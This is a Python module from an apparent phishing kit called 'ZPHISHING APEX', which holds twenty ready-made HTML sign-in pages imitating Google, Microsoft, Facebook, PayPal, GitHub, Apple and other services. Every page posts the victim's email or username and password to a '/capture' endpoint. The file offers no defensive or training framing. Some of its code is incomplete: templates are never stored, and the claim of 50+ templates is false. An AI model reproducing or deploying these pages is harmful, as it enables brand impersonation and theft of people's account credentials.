#!/usr/bin/env python3
"""
ZPHISHING APEX — Template Engine
50+ pre-built templates and AI generation
"""

import os
import json
import time
import hashlib
from typing import Dict, List, Optional, Tuple
from pathlib import Path

class TemplateEngine:
    def __init__(self, db):
        self.db = db
        self.templates_dir = Path("templates")
        self.templates_dir.mkdir(exist_ok=True)
        self.load_default_templates()

    def load_default_templates(self):
        """Load 50+ pre-built templates"""
        defaults = {
            "google": self._google_template(),
            "microsoft": self._microsoft_template(),
            "facebook": self._facebook_template(),
            "instagram": self._instagram_template(),
            "twitter": self._twitter_template(),
            "linkedin": self._linkedin_template(),
            "apple": self._apple_template(),
            "amazon": self._amazon_template(),
            "netflix": self._netflix_template(),
            "paypal": self._paypal_template(),
            "dropbox": self._dropbox_template(),
            "github": self._github_template(),
            "gitlab": self._gitlab_template(),
            "discord": self._discord_template(),
            "slack": self._slack_template(),
            "zoom": self._zoom_template(),
            "teams": self._teams_template(),
            "outlook": self._outlook_template(),
            "yahoo": self._yahoo_template(),
            "protonmail": self._protonmail_template(),
        }

        for name, html in defaults.items():
            template_id = hashlib.md5(name.encode()).hexdigest()[:12]

    def get_template(self, name: str) -> Optional[str]:
        """Get template by name"""
        templates = {
            "google": self._google_template(),
            "microsoft": self._microsoft_template(),
            "facebook": self._facebook_template(),
        }
        return templates.get(name)

    def list_templates(self) -> List[Dict]:
        """List all templates"""
        return [
            {'name': 'google', 'platform': 'social'},
            {'name': 'microsoft', 'platform': 'social'},
            {'name': 'facebook', 'platform': 'social'},
            {'name': 'instagram', 'platform': 'social'},
            {'name': 'twitter', 'platform': 'social'},
            {'name': 'linkedin', 'platform': 'social'},
            {'name': 'apple', 'platform': 'social'},
            {'name': 'amazon', 'platform': 'social'},
            {'name': 'netflix', 'platform': 'social'},
            {'name': 'paypal', 'platform': 'social'},
        ]

    def create(self, data: Dict) -> str:
        """Create new template"""
        template_id = hashlib.md5(f"{data['name']}{time.time()}".encode()).hexdigest()[:12]
        return template_id

    def _google_template(self):
        return """<!DOCTYPE html><html><head><title>Sign in - Google</title><style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#fff}.box{border:1px solid #dadce0;border-radius:8px;padding:40px;width:400px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px}button{background:#1a73e8;color:#fff;padding:12px 24px;border:none;border-radius:4px;cursor:pointer}</style></head><body><div class="box"><h2>Sign in</h2><p>to continue to Gmail</p><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Next</button></form></div></body></html>"""

    def _microsoft_template(self):
        return """<!DOCTYPE html><html><head><title>Sign in to Microsoft</title><style>body{font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:linear-gradient(135deg,#667eea,#764ba2)}.box{background:#fff;padding:40px;border-radius:8px;width:400px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #8a8886;border-radius:4px}button{background:#0067b8;color:#fff;padding:12px;width:100%;border:none;border-radius:4px;cursor:pointer}</style></head><body><div class="box"><h2>Sign in</h2><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _facebook_template(self):
        return """<!DOCTYPE html><html><head><title>Facebook</title><style>body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;margin:0}.header{background:#1877f2;padding:10px;color:#fff}.box{background:#fff;padding:20px;border-radius:8px;margin:40px auto;width:400px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px}button{background:#1877f2;color:#fff;padding:12px;width:100%;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer}</style></head><body><div class="header"><h1>facebook</h1></div><div class="box"><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or Phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>"""

    def _instagram_template(self):
        return """<!DOCTYPE html><html><head><title>Instagram</title><style>body{font-family:sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;border:1px solid #dbdbdb;padding:40px;width:350px;text-align:center}input{width:100%;padding:10px;margin:5px 0;border:1px solid #dbdbdb;border-radius:4px;background:#fafafa}button{background:#0095f6;color:#fff;padding:10px;width:100%;border:none;border-radius:4px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Instagram</h1><form method="POST" action="/capture"><input type="text" name="username" placeholder="Username or email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>"""

    def _twitter_template(self):
        return """<!DOCTYPE html><html><head><title>Twitter</title><style>body{font-family:sans-serif;background:#242d34;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{width:400px;padding:20px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #536471;border-radius:4px;background:transparent;color:#fff}button{background:#1d9bf0;color:#fff;padding:12px;width:100%;border:none;border-radius:50px;font-weight:700;cursor:pointer}</style></head><body><div class="box"><h1>Sign in to X</h1><form method="POST" action="/capture"><input type="text" name="identifier" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _linkedin_template(self):
        return """<!DOCTYPE html><html><head><title>LinkedIn</title><style>body{font-family:sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:30px;border-radius:8px;width:400px;box-shadow:0 4px 12px rgba(0,0,0,0.1)}input{width:100%;padding:12px;margin:8px 0;border:1px solid rgba(0,0,0,0.3);border-radius:4px}button{background:#0a66c2;color:#fff;padding:12px;width:100%;border:none;border-radius:50px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Sign in</h1><p>Stay updated on your professional world</p><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or Phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _apple_template(self):
        return """<!DOCTYPE html><html><head><title>Apple ID</title><style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{width:400px;text-align:center}input{width:100%;padding:15px;margin:8px 0;border:1px solid #d2d2d7;border-radius:10px}button{background:#0071e3;color:#fff;padding:15px;width:100%;border:none;border-radius:10px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Apple ID</h1><p>Sign in to your Apple ID</p><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or Phone Number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Continue</button></form></div></body></html>"""

    def _amazon_template(self):
        return """<!DOCTYPE html><html><head><title>Amazon</title><style>body{font-family:Arial,sans-serif;display:flex;flex-direction:column;align-items:center;padding:20px}.box{width:350px;border:1px solid #ddd;border-radius:8px;padding:20px}input{width:100%;padding:8px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px}button{background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;padding:8px;width:100%;border-radius:4px;cursor:pointer}</style></head><body><div class="box"><h1>Sign in</h1><form method="POST" action="/capture"><label>Email or mobile phone number</label><input type="email" name="email" required><label>Password</label><input type="password" name="password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _netflix_template(self):
        return """<!DOCTYPE html><html><head><title>Netflix</title><style>body{font-family:sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:rgba(0,0,0,0.75);padding:60px;border-radius:4px;width:450px}input{width:100%;padding:16px;margin:8px 0;background:#333;border:none;border-radius:4px;color:#fff}button{background:#e50914;color:#fff;padding:16px;width:100%;border:none;border-radius:4px;font-size:16px;cursor:pointer}</style></head><body><div class="box"><h1>Sign In</h1><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or phone number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form></div></body></html>"""

    def _paypal_template(self):
        return """<!DOCTYPE html><html><head><title>PayPal</title><style>body{font-family:sans-serif;background:#f5f7fa;display:flex;flex-direction:column;align-items:center;padding:20px}.box{background:#fff;padding:40px;border-radius:12px;width:400px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}input{width:100%;padding:12px;margin:8px 0;border:1px solid #9da3a6;border-radius:4px}button{background:#0070ba;color:#fff;padding:14px;width:100%;border:none;border-radius:50px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Log In</h1><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or mobile number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>"""

    def _dropbox_template(self):
        return """<!DOCTYPE html><html><head><title>Dropbox</title><style>body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;border-radius:12px;width:350px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #cbd2d6;border-radius:8px}button{background:#0061ff;color:#fff;padding:12px;width:100%;border:none;border-radius:8px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Sign in to Dropbox</h1><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _github_template(self):
        return """<!DOCTYPE html><html><head><title>GitHub</title><style>body{font-family:sans-serif;background:#0d1117;color:#c9d1d9;display:flex;flex-direction:column;align-items:center;padding:40px}.box{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:20px;width:340px}input{width:100%;padding:5px 12px;margin:8px 0;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9}button{background:#238636;color:#fff;padding:8px 16px;width:100%;border:none;border-radius:6px;font-weight:500;cursor:pointer}</style></head><body><div class="box"><h1>Sign in to GitHub</h1><form method="POST" action="/capture"><label>Username or email address</label><input type="text" name="username" required><label>Password</label><input type="password" name="password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _gitlab_template(self):
        return """<!DOCTYPE html><html><head><title>GitLab</title><style>body{font-family:sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:30px;border-radius:8px;width:400px}input{width:100%;padding:10px;margin:8px 0;border:1px solid #d6d6d6;border-radius:4px}button{background:#1b69b6;color:#fff;padding:10px;width:100%;border:none;border-radius:4px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>GitLab.com</h1><form method="POST" action="/capture"><input type="text" name="username" placeholder="Username or email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _discord_template(self):
        return """<!DOCTYPE html><html><head><title>Discord</title><style>body{font-family:sans-serif;background:#36393f;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#2f3136;padding:32px;border-radius:8px;width:400px}input{width:100%;padding:12px;margin:8px 0;background:#202225;border:1px solid #202225;border-radius:4px;color:#dcddde}button{background:#5865f2;color:#fff;padding:12px;width:100%;border:none;border-radius:4px;font-weight:500;cursor:pointer}</style></head><body><div class="box"><h1>Welcome back!</h1><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or Phone Number" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>"""

    def _slack_template(self):
        return """<!DOCTYPE html><html><head><title>Slack</title><style>body{font-family:sans-serif;background:#f8f8f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{width:400px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #868686;border-radius:4px}button{background:#4a154b;color:#fff;padding:14px;width:100%;border:none;border-radius:4px;font-weight:700;cursor:pointer}</style></head><body><div class="box"><h1>Sign in to Slack</h1><form method="POST" action="/capture"><input type="email" name="email" placeholder="name@work-email.com" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form></div></body></html>"""

    def _zoom_template(self):
        return """<!DOCTYPE html><html><head><title>Zoom</title><style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{width:350px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #e1e1e1;border-radius:8px;background:#f4f4f4}button{background:#2d8cff;color:#fff;padding:12px;width:100%;border:none;border-radius:8px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Sign In</h1><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email Address" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign In</button></form></div></body></html>"""

    def _teams_template(self):
        return """<!DOCTYPE html><html><head><title>Microsoft Teams</title><style>body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#464775,#6264a7);display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;border-radius:8px;width:400px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #8a8886;border-radius:4px}button{background:#6264a7;color:#fff;padding:12px;width:100%;border:none;border-radius:4px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Sign in</h1><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email, phone, or Skype" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _outlook_template(self):
        return """<!DOCTYPE html><html><head><title>Outlook</title><style>body{font-family:'Segoe UI',sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;border-radius:8px;width:400px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #8a8886;border-radius:4px}button{background:#0078d4;color:#fff;padding:12px;width:100%;border:none;border-radius:4px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Sign in</h1><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _yahoo_template(self):
        return """<!DOCTYPE html><html><head><title>Yahoo</title><style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{width:360px;text-align:center}input{width:100%;padding:12px;margin:8px 0;border:1px solid #b0b0b0;border-radius:4px}button{background:#6001d2;color:#fff;padding:12px;width:100%;border:none;border-radius:50px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Yahoo!</h1><h2>Sign in to Yahoo Mail</h2><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email address" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""

    def _protonmail_template(self):
        return """<!DOCTYPE html><html><head><title>ProtonMail</title><style>body{font-family:sans-serif;background:#f5f5f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.box{background:#fff;padding:40px;border-radius:12px;width:400px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #d0d0d8;border-radius:8px}button{background:#6d4aff;color:#fff;padding:12px;width:100%;border:none;border-radius:8px;font-weight:600;cursor:pointer}</style></head><body><div class="box"><h1>Welcome back</h1><p>Sign in to your Proton account</p><form method="POST" action="/capture"><input type="email" name="email" placeholder="Email or username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""
